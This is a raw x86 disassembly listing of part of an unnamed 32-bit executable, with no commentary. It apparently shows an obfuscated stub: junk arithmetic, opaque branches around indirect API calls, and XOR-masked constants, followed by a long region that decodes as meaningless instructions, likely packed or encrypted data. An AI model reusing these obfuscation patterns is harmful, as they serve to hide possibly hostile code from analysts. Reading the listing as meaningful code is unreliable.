  41eea1:	jae    0x41eed3
  41eea7:	push   DWORD PTR [ebp-0x20]
  41eeaa:	push   0x428289
  41eeaf:	call   DWORD PTR ds:0x428a58
  41eeb5:	xor    esi,esi
  41eeb7:	or     esi,DWORD PTR ds:0x4282bd
  41eebd:	or     esi,DWORD PTR ds:0x428211
  41eec3:	mov    DWORD PTR ds:0x4282bd,esi
  41eec9:	or     DWORD PTR ds:0x4281b1,0x1918
  41eed3:	adc    edx,DWORD PTR ds:0x428235
  41eed9:	xor    esi,edx
  41eedb:	adc    ecx,edx
  41eedd:	mov    ecx,eax
  41eedf:	cmp    DWORD PTR ds:0x428225,0x0
  41eee6:	not    edx
  41eee8:	mov    DWORD PTR ds:0x4281ad,edi
  41eeee:	movzx  edx,WORD PTR ds:0x4282b9
  41eef5:	jmp    0x41ef6a
  41eefa:	movzx  eax,WORD PTR ds:0x428225
  41ef01:	mov    DWORD PTR ds:0x428229,0xd1f
  41ef0b:	cmp    DWORD PTR ds:0x428225,0x0
  41ef12:	jle    0x41ef58
  41ef18:	push   0x1721
  41ef1d:	push   DWORD PTR [ebp-0x24]
  41ef20:	push   0x7cfa
  41ef25:	push   0x327e
  41ef2a:	push   0x3850
  41ef2f:	push   0x75ed
  41ef34:	call   DWORD PTR ds:0x428aac
  41ef3a:	mov    edx,DWORD PTR ds:0x428225
  41ef40:	sbb    edx,DWORD PTR ds:0x4281ad
  41ef46:	mov    DWORD PTR ds:0x428225,edx
  41ef4c:	or     esi,0x19f2
  41ef52:	add    DWORD PTR ds:0x42821d,edi
  41ef58:	or     DWORD PTR ds:0x428279,edx
  41ef5e:	sbb    DWORD PTR ds:0x4282cd,ebx
  41ef64:	and    edx,0x5eac
  41ef6a:	mov    eax,DWORD PTR [ebp-0xc]
  41ef6d:	mov    edx,DWORD PTR [ebp-0xa8]
  41ef73:	or     eax,edx
  41ef75:	movzx  esi,WORD PTR ds:0x428219
  41ef7c:	or     DWORD PTR ds:0x428225,esi
  41ef82:	mov    esi,DWORD PTR ds:0x422520
  41ef88:	sub    DWORD PTR ds:0x42827d,0x4282c9
  41ef92:	xor    edx,edx
  41ef94:	sub    DWORD PTR ds:0x42826d,0x428235
  41ef9e:	div    esi
  41efa0:	mov    edx,DWORD PTR [ebp-0xac]
  41efa6:	sub    eax,edx
  41efa8:	and    eax,0x1707
  41efad:	cmp    DWORD PTR ds:0x428199,0x0
  41efb4:	mov    DWORD PTR ds:0x4282d1,0x4d28
  41efbe:	mov    DWORD PTR ds:0x4281ad,0x43bb
  41efc8:	jmp    0x41f026
  41efcd:	mov    DWORD PTR ds:0x4282c5,0x22c4
  41efd7:	mov    DWORD PTR ds:0x428289,0x933
  41efe1:	cmp    DWORD PTR ds:0x428199,0x0
  41efe8:	je     0x41f00c
  41efee:	push   0x2c85
  41eff3:	push   DWORD PTR [ebp-0x20]
  41eff6:	call   DWORD PTR ds:0x428ab0
  41effc:	sub    esi,edx
  41effe:	xor    edx,edx
  41f000:	mov    esi,DWORD PTR ds:0x428211
  41f006:	or     DWORD PTR ds:0x428221,esi
  41f00c:	add    edx,esi
  41f00e:	mov    edx,DWORD PTR ds:0x42827d
  41f014:	or     DWORD PTR ds:0x4282c1,edx
  41f01a:	dec    DWORD PTR ds:0x428205
  41f020:	add    edx,DWORD PTR ds:0x428211
  41f026:	lea    eax,[ecx+eax*1-0x403]
  41f02d:	sub    DWORD PTR ds:0x42821d,edx
  41f033:	mov    DWORD PTR [ebp-0x54],eax
  41f036:	sbb    eax,eax
  41f038:	mov    DWORD PTR [ebp-0xa4],0x13b3
  41f042:	mov    DWORD PTR [ebp-0x88],0x30af
  41f04c:	sub    DWORD PTR ds:0x4281a5,edi
  41f052:	mov    eax,ds:0x422538
  41f057:	mov    edx,DWORD PTR ds:0x428275
  41f05d:	xor    DWORD PTR ds:0x428279,edx
  41f063:	mov    ecx,DWORD PTR ds:0x42253c
  41f069:	xor    ecx,0x3e65
  41f06f:	cmp    DWORD PTR ds:0x428225,0x0
  41f076:	mov    esi,0x422b
  41f07b:	mov    DWORD PTR ds:0x428239,0x6f5f
  41f085:	mov    DWORD PTR ds:0x4282b5,0x50f4
  41f08f:	jmp    0x41f101
  41f094:	mov    DWORD PTR ds:0x4282c1,0x565c
  41f09e:	cmp    DWORD PTR ds:0x428225,0x0
  41f0a5:	jne    0x41f0dd
  41f0ab:	push   DWORD PTR [ebp-0x28]
  41f0ae:	push   0x40b1
  41f0b3:	push   DWORD PTR [ebp-0x28]
  41f0b6:	push   DWORD PTR [ebp-0xc]
  41f0b9:	call   DWORD PTR ds:0x428ab4
  41f0bf:	xor    edx,edx
  41f0c1:	add    edx,DWORD PTR ds:0x4282dd
  41f0c7:	mov    edx,DWORD PTR [edx]
  41f0c9:	or     DWORD PTR ds:0x42826d,edx
  41f0cf:	mov    edx,DWORD PTR ds:0x428285
  41f0d5:	adc    DWORD PTR ds:0x428235,edx
  41f0db:	and    esi,edx
  41f0dd:	xor    DWORD PTR ds:0x42820d,ebx
  41f0e3:	sub    edx,DWORD PTR ds:0x428239
  41f0e9:	add    DWORD PTR ds:0x428279,ebx
  41f0ef:	mov    esi,DWORD PTR ds:0x42821d
  41f0f5:	sub    DWORD PTR ds:0x428215,esi
  41f0fb:	adc    DWORD PTR ds:0x4281a5,ebx
  41f101:	sub    ecx,eax
  41f103:	xor    esi,eax
  41f105:	or     ecx,0x30e5
  41f10b:	sub    DWORD PTR ds:0x4282bd,ebx
  41f111:	mov    eax,DWORD PTR [ebp-0x54]
  41f114:	adc    DWORD PTR ds:0x42821d,ecx
  41f11a:	lea    eax,[eax+ecx*1+0xc09]
  41f121:	neg    esi
  41f123:	mov    DWORD PTR [ebp-0xe8],eax
  41f129:	mov    eax,DWORD PTR [ebp-0xa4]
  41f12f:	mov    ecx,DWORD PTR ds:0x422534
  41f135:	sbb    esi,esi
  41f137:	mov    edx,DWORD PTR [ebp-0x88]
  41f13d:	or     edx,0x25c4
  41f143:	imul   edx,edx,0x72ea
  41f149:	cmp    DWORD PTR ds:0x4282b9,0x0
  41f150:	mov    DWORD PTR ds:0x4282c9,0x606e
  41f15a:	mov    DWORD PTR ds:0x428235,0x6005
  41f164:	mov    DWORD PTR ds:0x4282c5,0x6c9e
  41f16e:	jmp    0x41f1ce
  41f173:	mov    DWORD PTR ds:0x428281,0x1bec
  41f17d:	cmp    DWORD PTR ds:0x4282b9,0x0
  41f184:	je     0x41f1a5
  41f18a:	push   DWORD PTR [ebp-0x1c]
  41f18d:	call   DWORD PTR ds:0x4289c4
  41f193:	xor    DWORD PTR ds:0x428195,ebx
  41f199:	or     DWORD PTR ds:0x428209,edx
  41f19f:	add    DWORD PTR ds:0x428201,ebx
  41f1a5:	adc    DWORD PTR ds:0x428205,0x2c33
  41f1af:	adc    DWORD PTR ds:0x4282b5,0x58a8
  41f1b9:	dec    esi
  41f1ba:	xor    esi,esi
  41f1bc:	or     esi,DWORD PTR ds:0x428239
  41f1c2:	sub    esi,DWORD PTR ds:0x428241
  41f1c8:	mov    DWORD PTR ds:0x428239,esi
  41f1ce:	imul   edx,ecx
  41f1d1:	xor    edx,0x3715
  41f1d7:	cmp    DWORD PTR ds:0x428209,0x0
  41f1de:	mov    DWORD PTR ds:0x4281a9,edi
  41f1e4:	mov    DWORD PTR ds:0x428241,edi
  41f1ea:	mov    esi,0x58e8
  41f1ef:	jmp    0x41f274
  41f1f4:	mov    DWORD PTR ds:0x42821d,0x287a
  41f1fe:	cmp    DWORD PTR ds:0x428209,0x0
  41f205:	jge    0x41f248
  41f20b:	push   DWORD PTR [ebp-0x1c]
  41f20e:	push   DWORD PTR [ebp-0x14]
  41f211:	push   DWORD PTR [ebp-0x24]
  41f214:	push   0x8ea1
  41f219:	push   0x55a3
  41f21e:	call   DWORD PTR ds:0x4289c8
  41f224:	and    DWORD PTR ds:0x428201,0x7e13
  41f22e:	xor    esi,esi
  41f230:	xor    esi,DWORD PTR ds:0x4282b9
  41f236:	adc    DWORD PTR ds:0x4281fd,esi
  41f23c:	or     DWORD PTR ds:0x4282cd,edi
  41f242:	or     esi,0x7b1e
  41f248:	neg    DWORD PTR ds:0x428195
  41f24e:	and    DWORD PTR ds:0x42819d,ebx
  41f254:	sbb    DWORD PTR ds:0x42822d,0x1438
  41f25e:	mov    esi,DWORD PTR ds:0x4282c9
  41f264:	sbb    DWORD PTR ds:0x428285,esi
  41f26a:	and    DWORD PTR ds:0x428229,0x4281a5
  41f274:	and    edx,eax
  41f276:	cmp    DWORD PTR ds:0x428219,0x0
  41f27d:	mov    DWORD PTR ds:0x428285,0x7db0
  41f287:	mov    DWORD PTR ds:0x428191,0x4985
  41f291:	jmp    0x41f2ed
  41f296:	mov    DWORD PTR ds:0x428219,ebx
  41f29c:	movzx  eax,WORD PTR ds:0x4282c5
  41f2a3:	cmp    DWORD PTR ds:0x428219,0x0
  41f2aa:	ja     0x41f2cb
  41f2b0:	push   DWORD PTR [ebp-0x18]
  41f2b3:	call   DWORD PTR ds:0x428ab8
  41f2b9:	and    esi,esi
  41f2bb:	mov    esi,DWORD PTR ds:0x4281cd
  41f2c1:	mov    esi,DWORD PTR [esi]
  41f2c3:	sub    DWORD PTR ds:0x4282c1,esi
  41f2c9:	add    esi,esi
  41f2cb:	sub    DWORD PTR ds:0x42819d,0x428231
  41f2d5:	add    DWORD PTR ds:0x428229,edi
  41f2db:	mov    esi,DWORD PTR ds:0x4282bd
  41f2e1:	sub    esi,DWORD PTR ds:0x428215
  41f2e7:	mov    DWORD PTR ds:0x4282bd,esi
  41f2ed:	xor    edx,0x131
  41f2f3:	add    edx,DWORD PTR [ebp+0x8]
  41f2f6:	mov    DWORD PTR [ebp-0xe4],edx
  41f2fc:	mov    DWORD PTR [ebp-0xd0],0xcb89b676
  41f306:	cmp    DWORD PTR ds:0x428289,0x0
  41f30d:	mov    DWORD PTR ds:0x4282b1,0x50c
  41f317:	mov    DWORD PTR ds:0x4282b9,ecx
  41f31d:	not    DWORD PTR ds:0x4282cd
  41f323:	mov    edx,0x4bbd
  41f328:	jmp    0x41f38b
  41f32d:	mov    DWORD PTR ds:0x428215,0x34c
  41f337:	cmp    DWORD PTR ds:0x428289,0x0
  41f33e:	jbe    0x41f375
  41f344:	push   0x5acc
  41f349:	push   0x64d2
  41f34e:	push   0x5842
  41f353:	push   0x332a
  41f358:	push   0x47c2
  41f35d:	call   DWORD PTR ds:0x428abc
  41f363:	add    esi,0x2404
  41f369:	or     edx,DWORD PTR ds:0x428219
  41f36f:	xor    edx,DWORD PTR ds:0x4282c5
  41f375:	sbb    DWORD PTR ds:0x428279,0x30be
  41f37f:	sbb    edx,0x3e4
  41f385:	adc    DWORD PTR ds:0x428239,edi
  41f38b:	mov    DWORD PTR [ebp-0xcc],0x9d2b8af8
  41f395:	cmp    DWORD PTR ds:0x4282b1,0x0
  41f39c:	mov    edx,0x628d
  41f3a1:	mov    DWORD PTR ds:0x42821d,0x35fc
  41f3ab:	mov    DWORD PTR ds:0x428269,0x2e75
  41f3b5:	mov    DWORD PTR ds:0x428241,0x2441
  41f3bf:	jmp    0x41f416
  41f3c4:	mov    DWORD PTR ds:0x428191,0x38f4
  41f3ce:	cmp    DWORD PTR ds:0x4282b1,0x0
  41f3d5:	jae    0x41f3fc
  41f3db:	push   DWORD PTR [ebp-0x14]
  41f3de:	push   DWORD PTR [ebp-0xc]
  41f3e1:	push   0x3787
  41f3e6:	call   DWORD PTR ds:0x428ac0
  41f3ec:	sub    edx,0x6b9a
  41f3f2:	or     DWORD PTR ds:0x428201,ecx
  41f3f8:	sub    esi,esi
  41f3fa:	and    esi,esi
  41f3fc:	sub    esi,esi
  41f3fe:	dec    esi
  41f3ff:	inc    DWORD PTR ds:0x428199
  41f405:	mov    edx,DWORD PTR ds:0x428265
  41f40b:	mov    esi,DWORD PTR ds:0x4282a5
  41f411:	sub    esi,edx
  41f413:	xor    edx,DWORD PTR [edx+esi*1]
  41f416:	mov    DWORD PTR [ebp-0xc8],0xcb89b672
  41f420:	mov    DWORD PTR [ebp-0xc4],0x9d2b8af8
  41f42a:	cmp    DWORD PTR ds:0x4281fd,0x0
  41f431:	mov    DWORD PTR ds:0x4281a1,0x542d
  41f43b:	mov    DWORD PTR ds:0x4282b5,0x4522
  41f445:	mov    DWORD PTR ds:0x4282b1,0x3966
  41f44f:	mov    esi,DWORD PTR ds:0x428289
  41f455:	jmp    0x41f4a0
  41f45a:	mov    DWORD PTR ds:0x4282bd,0x3bad
  41f464:	not    eax
  41f466:	cmp    DWORD PTR ds:0x4281fd,0x0
  41f46d:	jg     0x41f48c
  41f473:	push   0x8ef3
  41f478:	push   0x577d
  41f47d:	push   0x428201
  41f482:	call   DWORD PTR ds:0x4289cc
  41f488:	and    edx,esi
  41f48a:	xor    esi,edx
  41f48c:	adc    edx,DWORD PTR ds:0x428209
  41f492:	or     esi,esi
  41f494:	sbb    esi,DWORD PTR ds:0x42826d
  41f49a:	add    DWORD PTR ds:0x428211,ebx
  41f4a0:	mov    esi,DWORD PTR [ebp-0xe8]
  41f4a6:	sub    edx,0x3886
  41f4ac:	mov    eax,DWORD PTR [ebp-0xc8]
  41f4b2:	mov    edx,DWORD PTR [ebp-0xc4]
  41f4b8:	xor    eax,0xcb89b676
  41f4bd:	xor    edx,0x9d2b8af8
  41f4c3:	xor    DWORD PTR ds:0x42823d,0x428219
  41f4cd:	mov    cl,0x2
  41f4cf:	or     DWORD PTR ds:0x428209,0x428285
  41f4d9:	call   0x4069e2
  41f4de:	cmp    DWORD PTR ds:0x4282b9,0x0
  41f4e5:	mov    ebx,DWORD PTR ds:0x428235
  41f4eb:	mov    DWORD PTR ds:0x428231,0x3675
  41f4f5:	mov    edi,DWORD PTR ds:0x42822d
  41f4fb:	jmp    0x41f569
  41f500:	mov    DWORD PTR ds:0x4281a1,0x6500
  41f50a:	mov    DWORD PTR ds:0x42823d,0x23dc
  41f514:	cmp    DWORD PTR ds:0x4282b9,0x0
  41f51b:	jle    0x41f552
  41f521:	push   0x6451
  41f526:	push   DWORD PTR [ebp-0xc]
  41f529:	push   DWORD PTR [ebp-0x18]
  41f52c:	push   DWORD PTR [ebp-0x1c]
  41f52f:	push   DWORD PTR [ebp-0x14]
  41f532:	call   DWORD PTR ds:0x428ac4
  41f538:	adc    DWORD PTR ds:0x4282b5,0x1427
  41f542:	or     DWORD PTR ds:0x428285,0x6a49
  41f54c:	or     ebx,DWORD PTR ds:0x42819d
  41f552:	or     DWORD PTR ds:0x428191,0x6ff7
  41f55c:	dec    edi
  41f55d:	sbb    DWORD PTR ds:0x428209,0x52a7
  41f567:	sub    ebx,ebx
  41f569:	mov    edi,eax
  41f56b:	mov    ebx,edx
  41f56d:	mov    eax,DWORD PTR [ebp-0xc8]
  41f573:	mov    edx,DWORD PTR [ebp-0xc4]
  41f579:	xor    eax,0xcb89b676
  41f57e:	xor    edx,0x9d2b8af8
  41f584:	mov    cl,0x3e
  41f586:	call   0x421c80
  41f58b:	or     edi,eax
  41f58d:	or     ebx,edx
  41f58f:	mov    eax,DWORD PTR [ebp-0xd0]
  41f595:	mov    edx,DWORD PTR [ebp-0xcc]
  41f59b:	xor    eax,0xcb89b676
  41f5a0:	xor    edx,0x9d2b8af8
  41f5a6:	mov    cl,0x2
  41f5a8:	call   0x4069e2
  41f5ad:	mov    ecx,edx
  41f5af:	mov    edx,DWORD PTR [ebp-0xd0]
  41f5b5:	mov    DWORD PTR [ebp-0x18c],esi
  41f5bb:	mov    esi,DWORD PTR [ebp-0xcc]
  41f5c1:	xor    edx,0xcb89b676
  41f5c7:	xor    esi,0x9d2b8af8
  41f5cd:	mov    DWORD PTR [ebp-0x190],eax
  41f5d3:	mov    eax,edx
  41f5d5:	mov    edx,esi
  41f5d7:	mov    DWORD PTR [ebp-0x194],ecx
  41f5dd:	mov    cl,0x3e
  41f5df:	call   0x421c80
  41f5e4:	mov    esi,DWORD PTR [ebp-0x190]
  41f5ea:	or     esi,eax
  41f5ec:	mov    eax,DWORD PTR [ebp-0x194]
  41f5f2:	or     eax,edx
  41f5f4:	push   eax
  41f5f5:	push   esi
  41f5f6:	push   ebx
  41f5f7:	push   edi
  41f5f8:	call   0x421ba4
  41f5fd:	jmp    0x41f89a
  41f602:	neg    BYTE PTR [esi-0xf]
  41f605:	mov    dl,0x79
  41f607:	mov    ebp,0xf0ad9ebd
  41f60c:	or     DWORD PTR ds:0x315ba54a,eax
  41f612:	and    al,0x9c
  41f614:	sar    DWORD PTR [ebx-0x4444404e],0xd2
  41f61b:	push   0xd0d74048
  41f620:	idiv   DWORD PTR [ecx+esi*8+0x32c8fbe4]
  41f627:	pop    es
  41f628:	xchg   edx,eax
  41f629:	inc    ebp
  41f62a:	pop    ecx
  41f62b:	nop
  41f62c:	add    BYTE PTR [esi-0x2e74ffb1],al
  41f632:	call   FWORD PTR [edi+0x5]
  41f635:	imul   ebx,DWORD PTR [esi],0x64
  41f638:	fnclex 
  41f63a:	test   al,0xfa
  41f63c:	or     al,0xaf
  41f63e:	mov    edi,0x4fdaf507
  41f643:	adc    DWORD PTR [edi-0x109730ee],0x186f5a55
  41f64d:	cmp    ebp,eax
  41f64f:	into   
  41f650:	push   edx
  41f651:	push   edx
  41f652:	mov    cl,0x71
  41f654:	push   es
  41f655:	in     eax,0x48
  41f657:	in     al,0x51
  41f659:	outs   dx,DWORD PTR ds:[esi]
  41f65a:	push   esi
  41f65b:	popf   
  41f65c:	lea    edx,[edx+0x65]
  41f65f:	cdq    
  41f660:	and    BYTE PTR [esp+eax*2],0xc3
  41f664:	jne    0x41f5ec
  41f666:	mov    ch,0xbe
  41f668:	fisttp DWORD PTR [ebx-0x3f]
  41f66b:	sbb    DWORD PTR [edx-0x4b8f61d7],eax
  41f671:	xor    eax,0x4c136513
  41f676:	dec    esi
  41f677:	and    bh,0xdf
  41f67a:	sbb    BYTE PTR [ebx+edx*1-0x14],0x78
  41f67f:	xor    eax,0xcdfed25f
  41f684:	xor    eax,0x9bad8a67
  41f689:	test   eax,0xd231c058
  41f68e:	in     eax,dx
  41f68f:	push   cs
  41f690:	repnz stos DWORD PTR es:[edi],eax
  41f692:	xchg   DWORD PTR [ecx+eax*1+0x5a33dd7f],edx
  41f699:	stc    
  41f69a:	or     bl,BYTE PTR [ebx+0x43]
  41f69d:	adc    bl,BYTE PTR [edi]
  41f69f:	sbb    DWORD PTR [eax],0xffffffa5
  41f6a2:	mov    ch,0xe9
  41f6a4:	jnp    0x41f6f3
  41f6a6:	xchg   edx,eax
  41f6a7:	fisub  DWORD PTR [eax+0x1b]
  41f6aa:	mov    ah,0x12
  41f6ac:	daa    
  41f6ad:	sub    al,0xfa
  41f6af:	cmp    BYTE PTR [esi+edi*1-0x64],dl
  41f6b3:	inc    eax
  41f6b4:	jbe    0x41f710
  41f6b6:	pop    ebp
  41f6b7:	dec    esi
  41f6b8:	in     al,dx
  41f6b9:	sbb    ch,dl
  41f6bb:	bound  edi,QWORD PTR [ecx-0x265bdafd]
  41f6c1:	mov    esi,esi
  41f6c3:	ss pop edx
  41f6c5:	mov    ebp,0xe637924b
  41f6ca:	sub    dl,BYTE PTR [ebp-0x43]
  41f6cd:	das    
  41f6ce:	les    ebx,FWORD PTR [esi-0x4e]
  41f6d1:	fwait
  41f6d2:	cmc    
  41f6d3:	fild   DWORD PTR [edi-0x4e6597af]
  41f6d9:	pop    eax
  41f6da:	mov    WORD PTR [ebp+0x37],?
  41f6dd:	gs popf 
  41f6df:	mov    ch,0xa
  41f6e1:	jecxz  0x41f6e0
  41f6e3:	shl    esi,cl
  41f6e5:	ret    
  41f6e6:	jle    0x41f671
  41f6e8:	sbb    bh,ah
  41f6ea:	dec    ebp
  41f6eb:	ins    BYTE PTR es:[edi],dx
  41f6ec:	int    0x51
  41f6ee:	dec    esi
  41f6ef:	cmp    eax,0x1d122582
  41f6f4:	(bad)
  41f6f9:	inc    ebx
  41f6fa:	cld    
  41f6fb:	cld    
  41f6fc:	push   cs
  41f6fd:	(bad)  
  41f6fe:	push   esi
  41f6ff:	pop    edi
  41f700:	xor    DWORD PTR [ebp-0x39],0x94bb1199
  41f707:	pop    ebp
  41f708:	mov    eax,ds:0x2a695345
  41f70d:	int    0x4
  41f70f:	jg     0x41f6f1
  41f711:	lock pop cx
  41f714:	sbb    eax,0x4b05d488
  41f719:	mov    bl,0x64
  41f71b:	scas   al,BYTE PTR es:[edi]
  41f71c:	push   ds
  41f71d:	ror    DWORD PTR [esi-0x50],cl
  41f720:	xchg   esp,eax
  41f721:	ds pop ds
  41f723:	mov    BYTE PTR [ebp-0x70],dl
  41f726:	cwde   
  41f727:	ss pop edx
  41f729:	jge    0x41f79b
  41f72b:	mov    bl,0xf9
  41f72d:	ins    BYTE PTR es:[edi],dx
  41f72e:	(bad)  
  41f72f:	jno    0x41f7a7
  41f731:	mov    ebx,0x2b07be6f
  41f736:	mov    dl,BYTE PTR [ebx]
  41f738:	ins    DWORD PTR es:[edi],dx
  41f739:	fadd   QWORD PTR [ebx]
  41f73b:	push   0xfe85ac15
  41f740:	loope  0x41f768
  41f742:	test   DWORD PTR [edi+ebp*1],ebp
  41f745:	push   0xffffffeb
  41f747:	mov    ecx,0x3f90c204
  41f74c:	and    ah,al
  41f74e:	inc    esp
  41f74f:	add    ebp,DWORD PTR [ebp+0x7b32c898]
  41f755:	mov    ebp,0x4adb75f4
  41f75a:	call   0xd601ab58
  41f75f:	pop    ds
  41f760:	mul    BYTE PTR [edx+0x4b]
  41f763:	xor    esp,DWORD PTR [ebp-0x6a7ffa41]
  41f769:	adc    ebp,DWORD PTR [ebp+ecx*4-0x7a75bb3d]
  41f770:	iret   
  41f771:	jecxz  0x41f779
  41f773:	or     al,0xe1
  41f775:	ficomp WORD PTR [edx-0x6c]
  41f778:	fsub   DWORD PTR [ebx-0x725406f6]
  41f77e:	pop    edi
  41f77f:	xor    esi,DWORD PTR [ebx+eax*1+0x435ff24c]
  41f786:	dec    ebx
  41f787:	(bad)  
  41f788:	adc    al,0xa0
  41f78a:	push   es
  41f78b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f78c:	not    dh
  41f78e:	mov    al,ds:0x69028e14
  41f793:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f794:	xor    BYTE PTR [esp+eax*2],0x7a
  41f798:	sti    
  41f799:	ins    BYTE PTR es:[edi],dx
  41f79a:	aad    0xfe
  41f79c:	test   al,0x85
  41f79e:	jbe    0x41f76e
  41f7a0:	pop    edx
  41f7a1:	popf   
  41f7a2:	jb     0x41f760
  41f7a4:	retf   
  41f7a5:	jns    0x41f727
  41f7a7:	mov    WORD PTR [ebx],gs
  41f7a9:	cld    
  41f7aa:	cmp    al,0x1d
  41f7ac:	pop    ecx
  41f7ad:	xchg   BYTE PTR [esi+0x3369fb13],al
  41f7b3:	xlat   BYTE PTR ds:[ebx]
  41f7b4:	mov    eax,ds:0x48a246c8
  41f7b9:	sar    BYTE PTR [esi+0x70],0x1
  41f7bd:	stos   BYTE PTR es:[edi],al
  41f7be:	int3   
  41f7bf:	mov    ch,0x11
  41f7c1:	jae    0x41f810
  41f7c3:	xor    DWORD PTR [edx],edx
  41f7c5:	stos   DWORD PTR es:[edi],eax
  41f7c6:	stos   DWORD PTR es:[edi],eax
  41f7c7:	pop    ecx
  41f7c8:	xchg   ebx,eax
  41f7c9:	gs inc edx
  41f7cb:	pop    edi
  41f7cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7cd:	mov    bh,0xdb
  41f7cf:	pop    edx
  41f7d0:	pop    ebx
  41f7d1:	xchg   ebp,eax
  41f7d2:	(bad)  
  41f7d3:	retf   
  41f7d4:	inc    edi
  41f7d5:	test   DWORD PTR [esi],ebx
  41f7d7:	aam    0x61
  41f7d9:	dec    esi
  41f7da:	push   ecx
  41f7db:	je     0x41f7c2
  41f7dd:	jge    0x41f794
  41f7df:	ret    0x7905
  41f7e2:	popf   
  41f7e3:	(bad)  
  41f7e4:	shl    BYTE PTR [esi],0xf5
  41f7e7:	std    
  41f7e8:	push   ss
  41f7e9:	xor    DWORD PTR [edx+0x7deaaca3],edi
  41f7ef:	push   ebx
  41f7f0:	xchg   ecx,eax
  41f7f1:	popf   
  41f7f2:	js     0x41f797
  41f7f4:	stc    
  41f7f5:	push   ecx
  41f7f6:	mov    al,0x8c
  41f7f8:	cmp    dl,BYTE PTR [eax+0x3d434384]
  41f7fe:	add    BYTE PTR [eax-0x230c79e1],ah
  41f804:	lds    eax,FWORD PTR [ecx+eax*1+0x2f]
  41f808:	mov    esi,0x78669546
  41f80d:	(bad)  
  41f80e:	imul   ebx,DWORD PTR [esi],0xb9ae2a9c
  41f814:	shl    BYTE PTR [esi+0x15],0x3f
  41f818:	xchg   esp,eax
  41f819:	mov    ebx,0x2ff323f5
  41f81e:	stos   BYTE PTR es:[edi],al
  41f81f:	mov    dl,0xb2
  41f821:	push   edi
  41f822:	shr    DWORD PTR [edi],cl
  41f824:	jno    0x41f8a5
  41f826:	dec    ebx
  41f827:	mov    eax,ds:0xf6c4f5c8
  41f82c:	lea    eax,[edi+0xe]
  41f82f:	in     eax,0xf5
  41f831:	ret    
  41f832:	cld    
  41f833:	je     0x41f840
  41f835:	je     0x41f81f
  41f837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f838:	sub    DWORD PTR [eax+0x7a06e017],ebx
  41f83e:	test   al,0x30
  41f840:	mov    ebx,0x148859bb
  41f845:	jmp    0x41f83d
  41f847:	cld    
  41f848:	mov    eax,0x85a1c77f
  41f84d:	or     DWORD PTR [edx-0x54667ce7],esp
  41f853:	retf   0xb4b9
  41f856:	push   ecx
  41f857:	fmul   DWORD PTR [edx-0x516c4fc1]
  41f85d:	popf   
  41f85e:	aaa    
  41f85f:	fldl2e 
  41f861:	dec    esi
  41f862:	inc    ebx
  41f863:	push   ebx
  41f864:	stos   DWORD PTR es:[edi],eax
  41f865:	push   esp
  41f866:	out    dx,eax
  41f867:	das    
  41f868:	std    
  41f869:	dec    ebx
  41f86a:	cmp    edx,DWORD PTR [ecx]
  41f86c:	xor    esi,DWORD PTR [eax]
  41f86e:	outs   dx,DWORD PTR ds:[esi]
  41f86f:	std    
  41f870:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f871:	(bad)  
  41f872:	in     eax,dx
  41f873:	hlt    
  41f874:	dec    esp
  41f875:	stos   BYTE PTR es:[edi],al
  41f876:	in     al,0x73
  41f878:	enter  0x623e,0xc9
  41f87c:	call   0xcdbfe37b
  41f881:	in     eax,dx
  41f882:	push   es
  41f883:	pop    ebx
  41f884:	or     esi,edi
  41f886:	outs   dx,BYTE PTR ds:[esi]
  41f887:	cmp    BYTE PTR [edx-0x3e],0x84
  41f88b:	inc    ebp
  41f88c:	push   edi
  41f88d:	ins    DWORD PTR es:[edi],dx
  41f88e:	test   BYTE PTR [ecx+eax*1],0xda
  41f892:	mov    ds:0x2ba2d792,eax
  41f897:	push   esi
  41f898:	mov    edi,0x74b58bcb
  41f89d:	(bad)  
  41f89e:	(bad)  
  41f89f:	(bad)  
  41f8a0:	cmp    esi,eax
  41f8a2:	jne    0x4203cc
  41f8a8:	mov    eax,DWORD PTR [ebp-0xc8]
  41f8ae:	mov    edx,DWORD PTR [ebp-0xc4]
  41f8b4:	jmp    0x41fb51
  41f8b9:	mov    es,WORD PTR [edi]
  41f8bb:	or     al,0x8d
  41f8bd:	popf   
  41f8be:	lea    ecx,[edi+0x1f30f91d]
  41f8c4:	xor    DWORD PTR [eax],edi
  41f8c6:	into   
  41f8c7:	sub    DWORD PTR [edi],0x1d
  41f8ca:	mov    al,ds:0xbfb2bbc1
  41f8cf:	mov    ebx,0xe21b6abb
  41f8d4:	pop    eax
  41f8d5:	or     ch,BYTE PTR [edi+edx*2]
  41f8d8:	mov    ds:0x45c36bea,eax
  41f8dd:	aaa    
  41f8de:	retf   0xd28c
  41f8e1:	or     BYTE PTR [eax],ch
  41f8e3:	das    
  41f8e4:	push   ebp
  41f8e5:	push   0x45
  41f8e7:	(bad)  
  41f8e8:	imul   eax,DWORD PTR [esi+0x7c],0xffffffac
  41f8ec:	add    BYTE PTR [esi+0x185813e9],0x84
  41f8f3:	add    BYTE PTR [ebp+0x78],dh
  41f8f6:	not    BYTE PTR [ebp+eiz*8-0x3e9f7597]
  41f8fd:	mov    DWORD PTR [eax+0x482a2479],esp
  41f903:	mov    eax,ds:0x7a99f3a2
  41f908:	pop    edi
  41f909:	push   0xc435de32
  41f90e:	mov    eax,0xc2fade24
  41f913:	xchg   ecx,eax
  41f914:	lock mov al,BYTE PTR [esi+0x3e220c9d]
  41f91b:	jae    0x41f93a
  41f91d:	pop    ss
  41f91e:	out    0xd4,eax
  41f920:	adc    bh,BYTE PTR [edx+0x59]
  41f923:	outs   dx,BYTE PTR ds:[esi]
  41f924:	outs   dx,DWORD PTR ds:[esi]
  41f925:	and    BYTE PTR [edi+ecx*1-0x50],cl
  41f929:	sbb    BYTE PTR [edi],dl
  41f92b:	ss jbe 0x41f973
  41f92e:	mov    dh,0x85
  41f930:	adc    BYTE PTR [eax+edi*1-0x72],dh
  41f934:	mov    bh,0x1d
  41f936:	lods   al,BYTE PTR ds:[esi]
  41f937:	inc    esp
  41f938:	xor    esp,esp
  41f93a:	lahf   
  41f93b:	pop    ebx
  41f93c:	pop    edx
  41f93d:	push   ss
  41f93e:	sahf   
  41f93f:	ja     0x41f8ed
  41f941:	sti    
  41f942:	or     edx,DWORD PTR [ebx-0x7ddfdbd6]
  41f948:	test   BYTE PTR [esi],ch
  41f94a:	inc    edx
  41f94b:	lods   al,BYTE PTR ds:[esi]
